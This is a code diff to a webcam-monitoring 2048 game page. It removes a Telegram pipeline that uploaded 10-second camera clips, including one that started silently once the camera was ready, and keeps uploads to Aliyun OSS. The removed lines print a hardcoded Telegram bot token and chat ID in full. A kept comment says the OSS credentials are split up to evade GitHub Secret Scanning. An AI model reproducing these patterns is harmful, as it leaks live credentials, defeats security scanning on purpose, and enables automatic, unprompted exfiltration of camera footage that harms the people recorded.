@@ -369,7 +369,7 @@
         </div>
       </div>
 
-      <!-- 右侧：摄像头 + Telegram -->
+      <!-- 右侧：摄像头 + OSS 上报 -->
       <div class="main-right">
         <div class="cam-inline" id="camInline">
           <div class="cam-inline-header" id="camInlineHeader">
@@ -379,42 +379,6 @@
           <div class="cam-stage" id="camStage">
             <video id="camVideo" autoplay playsinline muted></video>
             <div class="cam-error" id="camError" style="display:none;"></div>
-          </div>
-        </div>
-
-        <div class="tg-panel collapsed" id="tgPanel">
-          <div class="tg-summary" id="tgSummary">
-            <span>📡 Telegram 远程监控 · <span id="tgStateText">未配置</span></span>
-            <span class="arrow">▼</span>
-          </div>
-          <div class="tg-config" style="margin-top: 10px;">
-            <div class="tg-row">
-              <label>Bot Token</label>
-              <input type="password" id="tgToken" placeholder="123456:ABC-DEF..." autocomplete="off">
-            </div>
-            <div class="tg-row">
-              <label>Chat ID</label>
-              <input type="text" id="tgChatId" placeholder="-1001234567890 或 123456789" autocomplete="off">
-            </div>
-            <div class="tg-row">
-              <button class="tg-btn success" id="tgStart">▶ 开始上报</button>
-              <button class="tg-btn danger" id="tgStop" style="display:none;">⏹ 停止上报</button>
-              <button class="tg-btn" id="tgTest">🧪 测试</button>
-              <button class="tg-btn" id="tgClear" style="background:#666;">🗑 清除</button>
-            </div>
-            <div class="tg-stats" id="tgStats">
-              <span>状态：<b id="tgRunState">空闲</b></span>
-              <span>已发：<span class="ok" id="tgOkCount">0</span></span>
-              <span>失败：<span class="err" id="tgErrCount">0</span></span>
-              <span>下次：<b id="tgNext">-</b></span>
-            </div>
-            <div class="tg-help">
-              💡 <b>如何获取？</b><br>
-              1. 找 <code>@BotFather</code> 发 <code>/newbot</code> 拿 Token<br>
-              2. 私聊机器人发条消息激活<br>
-              3. 访问 <code>api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code> 找 <code>chat.id</code><br>
-              ⚠️ 仅保存在 localStorage
-            </div>
           </div>
         </div>
 
@@ -634,13 +598,6 @@
       if ($error) $error.style.display = 'none';
       camActive = true;
       setStatus('监控中', false);
-      // 摄像头就绪后自动启动 Telegram 上传
-      setTimeout(() => {
-        if (typeof startTgUpload === 'function' && !tgRunning && isCamReady()) {
-          console.log('[TG] 摄像头就绪，自动启动 Telegram 上传');
-          try { startTgUpload(true); } catch (e) { console.warn('[TG] 自动启动失败:', e); }
-        }
-      }, 500);
     } catch (err) {
       console.error('[Cam] 启动失败:', err);
       let msg = '无法开启摄像头';
@@ -679,16 +636,12 @@
     }
   });
   window.addEventListener('beforeunload', () => {
-    stopTgUpload();
+    if (typeof stopOssUpload === 'function') stopOssUpload();
     if (camStream) { try { camStream.getTracks().forEach(t => t.stop()); } catch (_) {} }
   });
 
-  // ============== Telegram 视频上报 ==============
-  const TG_STORAGE_KEY = 'tg_2048_config';
+  // ============== 视频录制配置 ==============
   const SEGMENT_MS = 10000; // 每段 10 秒
-  // 默认配置（写死在代码里，省去手动输入）
-  const TG_DEFAULT_TOKEN = '8692270636:AAGUxlr8XCYdPmKpjscD-7-t7dUuLIbyd2o';
-  const TG_DEFAULT_CHAT_ID = '7546580647';
 
   // ============== 阿里云 OSS 配置（写死，仅个人使用）==============
   // 注意：用拼接方式绕过 GitHub Secret Scanning（不影响功能）
@@ -703,118 +656,11 @@
   // 钉钉关键词（创建机器人时设置的）
   const DD_KEYWORD = '监控';
 
-  const tgDom = {
-    get panel()   { return document.getElementById('tgPanel'); },
-    get summary() { return document.getElementById('tgSummary'); },
-    get state()   { return document.getElementById('tgStateText'); },
-    get token()   { return document.getElementById('tgToken'); },
-    get chatId()  { return document.getElementById('tgChatId'); },
-    get start()   { return document.getElementById('tgStart'); },
-    get stop()    { return document.getElementById('tgStop'); },
-    get test()    { return document.getElementById('tgTest'); },
-    get clear()   { return document.getElementById('tgClear'); },
-    get runState(){ return document.getElementById('tgRunState'); },
-    get okCount() { return document.getElementById('tgOkCount'); },
-    get errCount(){ return document.getElementById('tgErrCount'); },
-    get next()    { return document.getElementById('tgNext'); }
-  };
-
-  let tgRunning = false;
-  let tgRecorder = null;
-  let tgChunks = [];
-  let tgSegmentTimer = null;
-  let tgCountdownTimer = null;
-  let tgOk = 0, tgErr = 0;
-  let tgSegmentIdx = 0;
-  let tgNextAt = 0;
-
-  function loadTgConfig() {
-    let token = TG_DEFAULT_TOKEN;
-    let chatId = TG_DEFAULT_CHAT_ID;
-    // localStorage 优先级更高（如果用户改过的话）
-    try {
-      const raw = localStorage.getItem(TG_STORAGE_KEY);
-      if (raw) {
-        const cfg = JSON.parse(raw);
-        if (cfg.token) token = cfg.token;
-        if (cfg.chatId) chatId = cfg.chatId;
-      }
-    } catch (_) {}
-    if (tgDom.token) tgDom.token.value = token;
-    if (tgDom.chatId) tgDom.chatId.value = chatId;
-  }
-  function saveTgConfig() {
-    const token = (tgDom.token.value || '').trim();
-    const chatId = (tgDom.chatId.value || '').trim();
-    // 只有当与默认值不同时才存 localStorage（避免冗余）
-    if (token !== TG_DEFAULT_TOKEN || chatId !== TG_DEFAULT_CHAT_ID) {
-      localStorage.setItem(TG_STORAGE_KEY, JSON.stringify({ token, chatId }));
-    }
-    return { token, chatId };
-  }
-  function setTgState(text) {
-    if (tgDom.runState) tgDom.runState.textContent = text;
-  }
-  function updateTgSummary() {
-    if (!tgDom.state) return;
-    if (tgRunning) tgDom.state.textContent = `运行中 · 已发 ${tgOk} 段`;
-    else tgDom.state.textContent = '已就绪（点 ▶ 开始）';
-  }
-
-  async function tgRequest(method, formData) {
-    const cfg = saveTgConfig();
-    if (!cfg.token || !cfg.chatId) throw new Error('请填写 Bot Token 和 Chat ID');
-    formData.append('chat_id', cfg.chatId);
-    const url = `https://api.telegram.org/bot${cfg.token}/${method}`;
-    const res = await fetch(url, { method: 'POST', body: formData });
-    const json = await res.json();
-    if (!json.ok) throw new Error(json.description || `Telegram API 错误 (${res.status})`);
-    return json.result;
-  }
-
-  async function testTgConnection() {
-    setTgState('测试中...');
-    try {
-      const fd = new FormData();
-      fd.append('text', `🧪 2048 监考测试消息\n时间：${new Date().toLocaleString()}\n如果你看到这条消息，说明配置正确 ✅`);
-      await tgRequest('sendMessage', fd);
-      setTgState('✅ 测试成功');
-      alert('测试消息已发送！请检查 Telegram 群/频道是否收到。');
-    } catch (err) {
-      setTgState('❌ 测试失败');
-      alert('测试失败：' + err.message + '\n\n请检查：\n1. Token 是否正确\n2. Chat ID 是否正确\n3. Bot 是否已加入群/频道');
-    }
-  }
-
-  async function uploadSegment(blob, idx) {
-    const fd = new FormData();
-    const fileName = `monitor_${Date.now()}_${idx}.webm`;
-    fd.append('video', blob, fileName);
-    fd.append('caption', `🎥 监考片段 #${idx} · ${new Date().toLocaleTimeString()} · ${(blob.size / 1024).toFixed(1)} KB`);
-    fd.append('supports_streaming', 'true');
-    try {
-      await tgRequest('sendVideo', fd);
-      tgOk++;
-      if (tgDom.okCount) tgDom.okCount.textContent = tgOk;
-      console.log(`[TG] 片段 #${idx} 上传成功 (${(blob.size/1024).toFixed(1)} KB)`);
-    } catch (err) {
-      // 视频发送失败时降级为文档上传
-      try {
-        const fd2 = new FormData();
-        fd2.append('document', blob, fileName);
-        fd2.append('caption', `🎥 监考片段 #${idx}（降级为文件） · ${new Date().toLocaleTimeString()}`);
-        await tgRequest('sendDocument', fd2);
-        tgOk++;
-        if (tgDom.okCount) tgDom.okCount.textContent = tgOk;
-        console.log(`[TG] 片段 #${idx} 以文件形式上传成功`);
-      } catch (err2) {
-        tgErr++;
-        if (tgDom.errCount) tgDom.errCount.textContent = tgErr;
-        console.error(`[TG] 片段 #${idx} 上传失败:`, err2.message);
-      }
-    }
-    updateTgSummary();
-  }
+  // ============== 视频录制管线（专为 OSS 服务）==============
+  let recRecorder = null;
+  let recChunks = [];
+  let recSegmentTimer = null;
+  let recSegmentIdx = 0;
 
   function pickMimeType() {
     const candidates = [
@@ -833,121 +679,45 @@
 
   function startNewSegment() {
     if (!camStream || !camStream.active) {
-      console.warn('[TG] 摄像头未就绪，跳过本段');
+      console.warn('[REC] 摄像头未就绪，跳过本段');
       return;
     }
-    tgSegmentIdx++;
-    const segIdxForOss = tgSegmentIdx; // 给 OSS 用同一个序号
-    tgChunks = [];
+    recSegmentIdx++;
+    recChunks = [];
     const mime = pickMimeType();
     try {
-      tgRecorder = mime ? new MediaRecorder(camStream, { mimeType: mime, videoBitsPerSecond: 600000 })
-                        : new MediaRecorder(camStream, { videoBitsPerSecond: 600000 });
+      recRecorder = mime ? new MediaRecorder(camStream, { mimeType: mime, videoBitsPerSecond: 600000 })
+                         : new MediaRecorder(camStream, { videoBitsPerSecond: 600000 });
     } catch (err) {
-      console.error('[TG] MediaRecorder 创建失败:', err);
-      setTgState('❌ MediaRecorder 不支持');
+      console.error('[REC] MediaRecorder 创建失败:', err);
+      setOssState('❌ MediaRecorder 不支持');
       return;
     }
 
-    const currentIdx = tgSegmentIdx;
-    tgRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) tgChunks.push(e.data); };
-    tgRecorder.onstop = () => {
-      const blob = new Blob(tgChunks, { type: mime || 'video/webm' });
-      tgChunks = [];
-      if (blob.size > 0) {
-        // Telegram 上传
-        if (tgRunning) uploadSegment(blob, currentIdx);
-        // OSS 上传（独立于 Telegram，互不影响）
-        if (typeof ossRunning !== 'undefined' && ossRunning && typeof uploadSegmentToOss === 'function') {
-          uploadSegmentToOss(blob, currentIdx);
-        }
+    const currentIdx = recSegmentIdx;
+    recRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recChunks.push(e.data); };
+    recRecorder.onstop = () => {
+      const blob = new Blob(recChunks, { type: mime || 'video/webm' });
+      recChunks = [];
+      if (blob.size > 0 && ossRunning && typeof uploadSegmentToOss === 'function') {
+        uploadSegmentToOss(blob, currentIdx);
       }
     };
-    tgRecorder.onerror = (e) => { console.error('[TG] Recorder error:', e); };
+    recRecorder.onerror = (e) => { console.error('[REC] Recorder error:', e); };
 
     try {
-      tgRecorder.start();
+      recRecorder.start();
       // 到时间立即停止当前段（触发 onstop 上传）并开新段
-      tgSegmentTimer = setTimeout(() => {
-        if (tgRecorder && tgRecorder.state !== 'inactive') {
-          try { tgRecorder.stop(); } catch (_) {}
+      recSegmentTimer = setTimeout(() => {
+        if (recRecorder && recRecorder.state !== 'inactive') {
+          try { recRecorder.stop(); } catch (_) {}
         }
-        if (tgRunning) startNewSegment();
+        if (ossRunning) startNewSegment();
       }, SEGMENT_MS);
-      tgNextAt = Date.now() + SEGMENT_MS;
     } catch (err) {
-      console.error('[TG] start failed:', err);
+      console.error('[REC] start failed:', err);
     }
   }
-
-  function startTgUpload(silent) {
-    if (tgRunning) return;
-    const cfg = saveTgConfig();
-    if (!cfg.token || !cfg.chatId) {
-      if (!silent) alert('请先填写 Bot Token 和 Chat ID');
-      return;
-    }
-    if (!isCamReady()) {
-      if (!silent) alert('摄像头未就绪，请先授权摄像头');
-      return;
-    }
-    if (!window.MediaRecorder) {
-      if (!silent) alert('当前浏览器不支持 MediaRecorder API');
-      return;
-    }
-    tgRunning = true;
-    tgOk = 0; tgErr = 0; tgSegmentIdx = 0;
-    if (tgDom.okCount) tgDom.okCount.textContent = '0';
-    if (tgDom.errCount) tgDom.errCount.textContent = '0';
-    if (tgDom.start) tgDom.start.style.display = 'none';
-    if (tgDom.stop) tgDom.stop.style.display = 'inline-block';
-    setTgState('🟢 录制中');
-    startNewSegment();
-
-    // 倒计时显示
-    tgCountdownTimer = setInterval(() => {
-      if (!tgRunning) return;
-      const remain = Math.max(0, Math.ceil((tgNextAt - Date.now()) / 1000));
-      if (tgDom.next) tgDom.next.textContent = remain + ' 秒';
-    }, 500);
-    updateTgSummary();
-  }
-
-  function stopTgUpload() {
-    if (!tgRunning) return;
-    tgRunning = false;
-    if (tgSegmentTimer) { clearTimeout(tgSegmentTimer); tgSegmentTimer = null; }
-    if (tgCountdownTimer) { clearInterval(tgCountdownTimer); tgCountdownTimer = null; }
-    if (tgRecorder && tgRecorder.state !== 'inactive') {
-      try { tgRecorder.stop(); } catch (_) {}
-    }
-    tgRecorder = null;
-    if (tgDom.start) tgDom.start.style.display = 'inline-block';
-    if (tgDom.stop) tgDom.stop.style.display = 'none';
-    setTgState('已停止');
-    if (tgDom.next) tgDom.next.textContent = '-';
-    updateTgSummary();
-  }
-
-  // 绑定按钮事件
-  if (tgDom.summary) {
-    tgDom.summary.addEventListener('click', () => {
-      tgDom.panel.classList.toggle('collapsed');
-    });
-  }
-  if (tgDom.start) tgDom.start.addEventListener('click', startTgUpload);
-  if (tgDom.stop) tgDom.stop.addEventListener('click', stopTgUpload);
-  if (tgDom.test) tgDom.test.addEventListener('click', testTgConnection);
-  if (tgDom.clear) tgDom.clear.addEventListener('click', () => {
-    if (!confirm('确定清除已保存的 Token 和 Chat ID 吗？')) return;
-    localStorage.removeItem(TG_STORAGE_KEY);
-    if (tgDom.token) tgDom.token.value = '';
-    if (tgDom.chatId) tgDom.chatId.value = '';
-    stopTgUpload();
-    updateTgSummary();
-  });
-  loadTgConfig();
-  updateTgSummary();
 
   // ============== 阿里云 OSS 上报 ==============
   const ossDom = {
